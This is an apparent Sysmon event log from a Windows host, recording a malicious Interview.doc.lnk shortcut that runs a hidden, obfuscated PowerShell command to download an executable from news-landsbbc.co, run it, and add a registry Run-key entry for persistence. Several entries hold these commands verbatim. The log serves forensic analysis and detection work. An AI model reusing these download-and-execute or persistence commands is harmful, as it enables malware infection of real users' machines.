情報,2019/11/07 15:18:01,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:18:01.211
ProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ProcessId: 900
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\ProgramData\USOPrivate\UpdateStore\updatestoretemp51b519d5-b6f5-4333-8df6-e74d7c9aead4.xml
CreationUtcTime: 2019-12-14 17:33:55.212
PreviousCreationUtcTime: 2019-11-07 06:18:01.164"
情報,2019/11/07 15:17:49,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:17:49.274
ProcessGuid: {CC41BF7E-500D-5A01-0000-00108FEA1B00}
ProcessId: 140
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:5604 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-500D-5A01-0000-00102CE01B00}
ParentProcessId: 5604
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:17:49,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:17:49.137
ProcessGuid: {CC41BF7E-500D-5A01-0000-00102CE01B00}
ProcessId: 5604
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:17:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:17:38.242
ProcessGuid: {CC41BF7E-4FA4-5A01-0000-00107FE41900}
ProcessId: 4772
Image: C:\Windows\System32\wbem\WmiPrvSE.exe"
情報,2019/11/07 15:17:03,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:17:03.039
ProcessGuid: {CC41BF7E-4FDC-5A01-0000-001063C31B00}
ProcessId: 5200
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:17:03,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:17:03.039
ProcessGuid: {CC41BF7E-4FDC-5A01-0000-001086C21B00}
ProcessId: 4940
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:17:03,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:17:03.023
ProcessGuid: {CC41BF7E-4FDE-5A01-0000-001089D71B00}
ProcessId: 4244
Image: C:\Windows\SysWOW64\reg.exe"
情報,2019/11/07 15:17:02,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:17:02.961
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:17:02,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:17:02.961
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:17:02,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:17:02.968
ProcessGuid: {CC41BF7E-4FDE-5A01-0000-001089D71B00}
ProcessId: 4244
Image: C:\Windows\SysWOW64\reg.exe
CommandLine: reg  add hkcu\software\microsoft\windows\currentversion\run /v netshare /f /d C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\vmcon.exe /t REG_EXPAND_SZ
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=58EA87FF0A63C55E6609152C5B731755016D9872
ParentProcessGuid: {CC41BF7E-4FDC-5A01-0000-001086C21B00}
ParentProcessId: 4940
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: c:\windows\system32\cmd.exe"
情報,2019/11/07 15:17:01,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:17:01.289
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:17:01,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:17:01.211
ProcessGuid: {CC41BF7E-4FDD-5A01-0000-0010EBC61B00}
ProcessId: 4832
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:17:01,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:17:01.184
ProcessGuid: {CC41BF7E-4FDD-5A01-0000-0010EBC61B00}
ProcessId: 4832
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey B64EA1AC-7C90-5C9A-48FE-1AA828EEFD22 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:17:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:17:00.912
ProcessGuid: {CC41BF7E-4FDC-5A01-0000-001063C31B00}
ProcessId: 5200
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-4FDC-5A01-0000-001086C21B00}
ParentProcessId: 4940
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: c:\windows\system32\cmd.exe"
情報,2019/11/07 15:17:00,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:17:00.898
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:17:00,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:17:00.898
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:17:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:17:00.899
ProcessGuid: {CC41BF7E-4FDC-5A01-0000-001086C21B00}
ProcessId: 4940
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: c:\windows\system32\cmd.exe
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:16:59,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:59.351
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:59,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:59.179
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:59,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:59.101
ProcessGuid: {CC41BF7E-4FDB-5A01-0000-001093B11B00}
ProcessId: 6124
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:16:59,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:59.078
ProcessGuid: {CC41BF7E-4FDB-5A01-0000-001093B11B00}
ProcessId: 6124
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey A7BC3178-7E33-2F95-7B7E-9DE365DCFCC9 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:16:57,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:57.867
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:57,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:57.867
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:16:57,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:57.871
ProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ProcessId: 4964
Image: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
CommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=E8B071E0DCD7BDB6B3C066D01C51BEA6E371B927
ParentProcessGuid: {CC41BF7E-4FD5-5A01-0000-0010B7831B00}
ParentProcessId: 5560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\System32\cmd.exe"" /c start winword /m&powershell -windowstyle hidden $c='(new-object System.Net.WebClient).D'+'ownloadFile(""""""http://news-landsbbc.co/upload/21.jpg                                 """""", """"""$env:tmp\dwm.exe"""""")';Invoke-Expression $c&C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe ""%CD%"""
情報,2019/11/07 15:16:57,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:57.820
ProcessGuid: {CC41BF7E-4FD8-5A01-0000-001025941B00}
ProcessId: 5764
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
情報,2019/11/07 15:16:57,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:57.789
ProcessGuid: {CC41BF7E-4FD9-5A01-0000-00107BAA1B00}
ProcessId: 5452
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:16:57,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:57.759
ProcessGuid: {CC41BF7E-4FD9-5A01-0000-00107BAA1B00}
ProcessId: 5452
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 7CBB914E-9CDE-073A-93B8-EA4BA6729E21 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:16:56,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:56.351
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:56,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:56.351
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:16:56,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:56.357
ProcessGuid: {CC41BF7E-4FD8-5A01-0000-001025941B00}
ProcessId: 5764
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell  -windowstyle hidden $c='(new-object System.Net.WebClient).D'+'ownloadFile(""""""http://news-landsbbc.co/upload/21.jpg                                 """""", """"""$env:tmp\dwm.exe"""""")';Invoke-Expression $c
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=5F710E3665D26B17EF57E87F3AECD19F0513B8D9
ParentProcessGuid: {CC41BF7E-4FD5-5A01-0000-0010B7831B00}
ParentProcessId: 5560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\System32\cmd.exe"" /c start winword /m&powershell -windowstyle hidden $c='(new-object System.Net.WebClient).D'+'ownloadFile(""""""http://news-landsbbc.co/upload/21.jpg                                 """""", """"""$env:tmp\dwm.exe"""""")';Invoke-Expression $c&C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe ""%CD%"""
情報,2019/11/07 15:16:53,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:53.079
ProcessGuid: {CC41BF7E-4FD5-5A01-0000-001049841B00}
ProcessId: 5148
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-4FD5-5A01-0000-0010B7831B00}
ParentProcessId: 5560
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\System32\cmd.exe"" /c start winword /m&powershell -windowstyle hidden $c='(new-object System.Net.WebClient).D'+'ownloadFile(""""""http://news-landsbbc.co/upload/21.jpg                                 """""", """"""$env:tmp\dwm.exe"""""")';Invoke-Expression $c&C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe ""%CD%"""
情報,2019/11/07 15:16:53,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:53.068
ProcessGuid: {CC41BF7E-4FD5-5A01-0000-0010B7831B00}
ProcessId: 5560
Image: C:\Windows\System32\cmd.exe
CommandLine: ""C:\Windows\System32\cmd.exe"" /c start winword /m&powershell -windowstyle hidden $c='(new-object System.Net.WebClient).D'+'ownloadFile(""""""http://news-landsbbc.co/upload/21.jpg                                 """""", """"""$env:tmp\dwm.exe"""""")';Invoke-Expression $c&C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe ""%CD%""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=99AE9C73E9BEE6F9C76D6F4093A9882DF06832CF
ParentProcessGuid: {CC41BF7E-4CF3-5A01-0000-0010EB5D0300}
ParentProcessId: 2144
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
情報,2019/11/07 15:16:50,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:50.742
ProcessGuid: {CC41BF7E-4FC6-5A01-0000-0010A08B1A00}
ProcessId: 1352
Image: C:\Windows\System32\dllhost.exe"
情報,2019/11/07 15:16:48,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:16:48.492
ProcessGuid: {CC41BF7E-4FD0-5A01-0000-0010F6421B00}
ProcessId: 6140
Image: C:\Windows\system32\backgroundTaskHost.exe
TargetFilename: C:\Users\maebashi.gunma\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache\AppCache131545090081390955.txt.~tmp
CreationUtcTime: 2019-11-07 06:16:48.461
PreviousCreationUtcTime: 2019-11-07 06:16:48.461"
情報,2019/11/07 15:16:48,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:48.011
ProcessGuid: {CC41BF7E-4FD0-5A01-0000-0010F6421B00}
ProcessId: 6140
Image: C:\Windows\System32\backgroundTaskHost.exe
CommandLine: ""C:\Windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca
CurrentDirectory: C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: AppContainer
Hashes: SHA1=8B4E7D875398E67D5277D9C8C9BFA027F9705EDC
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:16:46,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:46.086
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:46,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:46.070
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:45.992
ProcessGuid: {CC41BF7E-4FCD-5A01-0000-0010BD241B00}
ProcessId: 5808
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:16:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:45.966
ProcessGuid: {CC41BF7E-4FCD-5A01-0000-0010BD241B00}
ProcessId: 5808
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 9CB27951-23D4-4C61-7F82-566644235300 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:16:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:45.586
ProcessGuid: {CC41BF7E-4FCD-5A01-0000-0010D3FD1A00}
ProcessId: 2252
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:16:45,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:45.557
ProcessGuid: {CC41BF7E-4FCD-5A01-0000-0010D3FD1A00}
ProcessId: 2252
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 2B7859AA-151A-816E-359B-1FB8B64A4796 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:16:45,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:45.070
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:45,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:45.070
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:45,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 06:16:44.914
ProcessGuid: {CC41BF7E-4CF3-5A01-0000-0010EB5D0300}
ProcessId: 2144
Image: C:\Windows\Explorer.EXE
TargetFilename: C:\Users\maebashi.gunma\Desktop\Interview.doc.lnk
CreationUtcTime: 2019-09-28 06:59:40.000
PreviousCreationUtcTime: 2019-11-07 06:16:44.804"
情報,2019/11/07 15:16:44,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:44.882
ProcessGuid: {CC41BF7E-4FCC-5A01-0000-001094B31A00}
ProcessId: 5240
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:16:44,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:44.848
ProcessGuid: {CC41BF7E-4FCC-5A01-0000-001094B31A00}
ProcessId: 5240
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" GetDeviceTicket -AccessKey 58C47327-E3FB-711B-3C78-BBAF440A3E7A 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:16:38,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:38.945
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:38,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:38.945
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:16:38,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:38.931
ProcessGuid: {CC41BF7E-4FC6-5A01-0000-0010A08B1A00}
ProcessId: 1352
Image: C:\Windows\System32\dllhost.exe
CommandLine: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=0E33FA9CE0074155F361DB9CB36183431C8FC266
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:16:38,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:16:38.289
ProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ProcessId: 1968
Image: C:\Program Files\Windows Defender\MsMpEng.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:16:38,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:16:38.179
ProcessGuid: {CC41BF7E-4FC6-5A01-0000-00108A721A00}
ProcessId: 6072
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:16:38,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:16:38.155
ProcessGuid: {CC41BF7E-4FC6-5A01-0000-00108A721A00}
ProcessId: 6072
